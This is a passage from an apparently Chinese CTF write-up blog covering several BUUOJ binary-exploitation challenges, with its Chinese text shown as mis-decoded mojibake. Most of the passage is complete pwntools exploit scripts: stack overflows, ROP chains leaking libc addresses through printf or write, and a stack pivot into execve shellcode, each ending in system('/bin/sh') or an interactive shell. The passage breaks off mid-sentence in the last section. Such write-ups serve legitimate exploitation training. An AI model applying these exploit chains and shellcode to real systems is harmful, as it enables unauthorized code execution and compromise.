·è¦<code>libc</code>æ³„æ¼</p><p>ç¨‹åºé‡Œé¢æ²¡æœ‰<code>puts</code>ï¼Œæœ‰<code>printf</code>ã€‚åšåˆ°è¿™é‡Œå‘ç°å¯¹æ ˆæº¢å‡ºçš„æ“ä½œäº†è§£è¿˜æ˜¯å¤ªå°‘äº†ï¼Œäºæ˜¯åšä¸ª[æ€»ç»“]å§</p><p>åˆ©ç”¨<code>printf</code>ä½œæ³„æ¼ï¼Œæ„é€ <code>printf(&quot;%s&quot;, got[read])</code></p><p>é—®é¢˜æ˜¯<code>%s</code>ä»å“ªé‡Œæï¼Ÿå®åœ¨æ²¡æœ‰åŠæ³•åªèƒ½è‡ªå·±å¾€æ ˆä¸Šå†™ï¼Œç„¶åæƒ³åŠæ³•æåˆ°å†™çš„ä½ç½®çš„åœ°å€ï¼Œç±»ä¼¼çš„æ–¹å¼åœ¨[[pwn(2025.8.20)#^3e2b39|ciscn_2019_es_2]]é‡åˆ°è¿‡ã€‚ä½†æ˜¯è¿™é‡Œå®é™…ä¸Šæ˜¯æœ‰<code>%s</code>çš„ï¼Œé¢˜ç›®ä¸­æœ‰å·²ç»å­˜åœ¨çš„<code>printf</code>é‡Œé¢æœ‰ï¼Œç›´æ¥ç”¨ã€‚æ³„éœ²å®ŒåŸºåœ°å€ç›´æ¥æ‰“å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br><span class="hljs-comment"># context.log_level=&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27572&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> x, a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>pop_rdi_ret = <span class="hljs-number">0x400733</span><br>main = <span class="hljs-number">0x400636</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x400731</span><br>printf = <span class="hljs-number">0x4004F0</span><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>s = <span class="hljs-number">0x400770</span><br>main = <span class="hljs-number">0x400636</span><br><br><span class="hljs-comment"># dbg(&quot;b read&quot;)</span><br>ru(<span class="hljs-string">b&#x27;name?&#x27;</span>)<br>payload = <span class="hljs-number">0x27</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> + p64(pop_rdi_ret) + p64(s) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(<span class="hljs-number">0x0</span>) + p64(printf) + p64(main) + <span class="hljs-string">b&#x27;a&#x27;</span><br>sd(payload)<br>ru(<span class="hljs-string">b&#x27;!&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;again, &#x27;</span>)<br>read_addr = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;read_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)<br>libc_addr = read_addr - <span class="hljs-number">0xf7250</span><br>system = libc_addr + <span class="hljs-number">0x45390</span><br>bin_sh = libc_addr + <span class="hljs-number">0x18cd57</span><br>ru(<span class="hljs-string">b&#x27;name? &#x27;</span>)<br>payload = <span class="hljs-number">0x27</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;b&#x27;</span> + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + <span class="hljs-string">b&#x27;a&#x27;</span><br>sd(payload)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>flag</p><h1 id="X-CTF-Quals-2016-b0verfl0w-Stack-Pivoting"><a href="#X-CTF-Quals-2016-b0verfl0w-Stack-Pivoting" class="headerlink" title="X-CTF Quals 2016 - b0verfl0w [Stack Pivoting]"></a>X-CTF Quals 2016 - b0verfl0w [Stack Pivoting]</h1><p>^f9bd12</p><p>32ä½åŠ¨æ€é“¾æ¥ç¨‹åºï¼š<br><img src="/images/20250821114711.png"><br>æº¢å‡ºé•¿åº¦åªæœ‰0x10å­—èŠ‚ï¼Œä¸å¤Ÿæ”¾ä¸€èˆ¬çš„<code>shellcode</code>ï¼Œæ‰€ä»¥è€ƒè™‘å°†shellcodeå†™åˆ°æ ˆä¸Šï¼Œç„¶ååˆ©ç”¨ä¸€äº›æ–¹å¼åšæ ˆè¿ç§»ã€‚è¿™é“é¢˜ä¸­æœ‰ä¸€ä¸ª<code>gadget</code>ä¸ºï¼š<code>jmp esp</code>ï¼Œæ‰€ä»¥å¯ä»¥æƒ³åŠæ³•ä¿®æ”¹<code>esp</code>ä½¿å¾—<code>esp</code>æŒ‡å‘<code>shellcode</code>æ‰€åœ¨çš„ä½ç½®ã€‚ä½†æ˜¯<code>shellcode</code>æ‰€åœ¨ä½ç½®ä¸º<code>return_addr - 0x24</code>ï¼Œæ‰€ä»¥å°†è¿”å›åœ°å€å…ˆæ”¹ä¸º<code>jmp esp</code>ï¼Œç„¶åä¸‹ä¸€ä¸ªæ ˆå¸§æ”¹ä¸º<code>sub esp, 0x28; jmp esp</code>ï¼Œå°±èƒ½å¤Ÿè·³åˆ°<code>s</code>çš„ä½ç½®ï¼Œå³æˆ‘ä»¬è¾“å…¥<code>shellcode</code>çš„åœ°æ–¹ã€‚</p><p>å¸¸è§çš„<code>shellcode</code>å¯ä»¥åœ¨<a href="https://shell-storm.org/shellcode/index.html">è¿™é‡Œ</a>å¯»æ‰¾</p><p>æœ€åçš„ä»£ç ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>Local = <span class="hljs-literal">True</span><br><span class="hljs-comment"># Local = False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:26066&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./ret2reg&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br><br>rl = <span class="hljs-keyword">lambda</span> x, a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span>: gdb.attach(p)<br><br><br>jmp_esp = <span class="hljs-number">0x08048504</span><br>sub_esp_jmp = <span class="hljs-string">b&#x27;\x83\xec(\xff\xe4&#x27;</span><br>shell_code = <span class="hljs-string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="hljs-comment">#---------begin--------#</span><br>dbg()<br><br>ru(<span class="hljs-string">b&quot;What&#x27;s your name?\n&quot;</span>)<br><br>payload = shell_code + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x24</span>-<span class="hljs-built_in">len</span>(shell_code)) + p32(jmp_esp) + sub_esp_jmp<br>sl(payload)<br>ia()<br></code></pre></td></tr></table></figure><p>ropï¼ŒåŠ äº†ä¸€äº›é™åˆ¶æ¡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25006&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> x, a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>pop_ebx_ret = <span class="hljs-number">0x0804840d</span><br>win1 = <span class="hljs-number">0x080485CB</span><br>win2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><span class="hljs-comment"># dbg(&quot;&quot;&quot;</span><br><span class="hljs-comment">#     b flag</span><br><span class="hljs-comment"># &quot;&quot;&quot;)</span><br>ru(<span class="hljs-string">b&#x27;Enter your input&gt; &#x27;</span>)<br>payload = p32(<span class="hljs-number">0xDEADBAAD</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x1c</span> - <span class="hljs-number">0x5</span>) + p32(win1) + p32(win2) + p32(pop_ebx_ret) + p32(<span class="hljs-number">0xBAAAAAAD</span>) + p32(flag) +p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0xDEADBAAD</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>é¦–å…ˆè¦æƒ³åŠæ³•ç»•è¿‡<code>atoi</code>ä»è€Œèƒ½å¤Ÿå®ç°<code>ROP</code>ã€‚æœ‰ä¸€ä¸ªå‡½æ•°<code>dosomething</code>é‡Œé¢æœ‰<code>int 0x80</code>ç³»ç»Ÿè°ƒç”¨ï¼Œæƒ³åŠæ³•ç”¨è¿™ä¸ªå‡½æ•°å¾—åˆ°<code>shell</code>ã€‚emmmåšçš„æ—¶å€™æœ€ç»ˆæ²¡é€‰æ‹©è¿™æ ·ï¼ŒROP <code>system(&#39;/bin/sh&#39;)</code>å¾—åˆ°çš„shellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27531&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br>pop_ebx_ret = <span class="hljs-number">0x0804840d</span><br>win1 = <span class="hljs-number">0x080485CB</span><br>win2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><span class="hljs-comment"># dbg(&quot;&quot;&quot;</span><br><span class="hljs-comment">#     b vuln</span><br><span class="hljs-comment"># &quot;&quot;&quot;)</span><br>ru(<span class="hljs-string">b&#x27;How many bytes do you want me to read? &#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;data!\n&#x27;</span>)<br><span class="hljs-comment"># get return addr</span><br><br>str1 = <span class="hljs-number">0x080486F8</span><br>vuln = <span class="hljs-number">0x0804852F</span><br>printf = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>getchar_got = elf.got[<span class="hljs-string">&#x27;getchar&#x27;</span>]<br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>pop_2_ret = <span class="hljs-number">0x0804864e</span><br><span class="hljs-comment"># leak address of libc by printf</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x2c</span> + <span class="hljs-number">0x4</span> - <span class="hljs-number">0x1</span>) + <span class="hljs-string">b&#x27;b&#x27;</span><br>payload += p32(printf) + p32(vuln) + p32(str1) + p32(printf_got)<br>sl(payload)<br>rl()<br>ru(<span class="hljs-string">b&#x27;You said: &#x27;</span>)<br>printf_addr = u32(rv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;printf_Addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)<br>obj = LibcSearcher(<span class="hljs-string">&quot;printf&quot;</span>, printf_addr)<br><span class="hljs-comment"># libc_addr = getchar_addr - libc.sym[&#x27;atoi&#x27;]</span><br>libc_addr = printf_addr - obj.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br><br>system = libc_addr + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc_addr + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment"># system = libc_addr + libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment"># bin_sh = libc_addr + next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><br><span class="hljs-comment"># system(&#x27;/bin/sh&#x27;)</span><br>ru(<span class="hljs-string">b&#x27;How many bytes do you want me to read? &#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;data!\n&#x27;</span>)<br><span class="hljs-comment"># get return addr</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p32(system) + p32(vuln) + p32(bin_sh)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>å› ä¸ºä¸€ç›´æ²¡æ‰¾åˆ°<code>libc</code>ï¼Œè¿œç¨‹æ‰“ä¸é€šï¼Œæœ¬åœ°è¿˜æ˜¯å¾ˆå¥½æ‰“çš„</p><h1 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h1><p>32ä½ï¼Œåªå¼€å¯ NX enable<br><img src="/images/20250827151704.png"><br>åªèƒ½æº¢å‡º8å­—èŠ‚ï¼Œåé—¨å‡½æ•°ä¸º<code>shell</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;Linux&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="hljs-number">29329</span>)<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>shell = <span class="hljs-number">0x0804851B</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1c</span> + p32(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>ä¹Ÿæ˜¯ç®€å•çš„ROPï¼Œåªå¼€å¯äº†NX enable<br>ç›´æ¥æ‰“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;Linux&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="hljs-number">27777</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main = <span class="hljs-number">0x08048484</span><br><span class="hljs-comment">#------leak libc addr------#</span><br>payload = (<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(write_plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;write_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(write)&#125;</span>&quot;</span>)<br>obj = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>, write)<br>libc = write - obj.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>payload = (<span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(main) + p32(bin_sh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>64ä½ï¼Œåªå¼€å¯äº†NXä¿æŠ¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><p><img src="/images/20250828091840.png"><br><code>call function_addr</code> ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤å‹æ ˆï¼Œç„¶åè·³è½¬åˆ°å‡½æ•°åœ°å€å¼€å§‹æ‰§è¡Œã€‚æˆ‘è¿™é‡Œä¼ å…¥äº†<code>ret</code>ï¼Œæ‰€ä»¥æœ€ç»ˆæ ˆçš„ç»“æ„ä¸å˜ï¼Œä¹Ÿä¸ä¼šå½±å“ROPé“¾ã€‚<br><img src="/images/20250828092130.png"><br>ä¸‹å›¾æ˜¯æ‰§è¡Œå®Œ<code>call qword ptr [r12]</code>çš„ç»“æœ<br><img src="/images/20250828091932.png"><br>è¿™ä¸ªé¢˜ç›®æ˜¯è¿‘æœŸåšçš„ç›¸å¯¹æ¯”è¾ƒéº»çƒ¦çš„ï¼Œåˆ©ç”¨æ€è·¯æ¯”è¾ƒç®€å•ï¼Œä½†æœ‰ä¸€äº›ç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œä¸­é—´é‡åˆ°äº†å‡ ä¸ªç‚¹ï¼š</p><ol><li>ret2csuä¹‹åï¼Œå¯¹å‚æ•°è®¾ç½®ï¼Œç”±äºæ˜¯<code>mov edi, r15d</code>ï¼Œæ‰€ä»¥å…¶å®<code>/bin/sh</code>çš„åœ°å€åœ¨è¿™ä¸ªæ—¶å€™æ˜¯ä¼ ä¸è¿‡æ¥çš„ï¼Œéœ€è¦åœ¨åé¢å†æ¬¡ä¼ ä¸€ä¸‹ã€‚</li><li><code>call qword pttr [r12 + rbp*8]</code>è¿™ä¸€æ­¥ï¼Œr12å­˜çš„æ˜¯ä¸€ä¸ªå‡½æ•°çš„ä¸­é—´åœ°å€ã€‚<code>call</code>æ˜¯å°†åœ°å€å‹æ 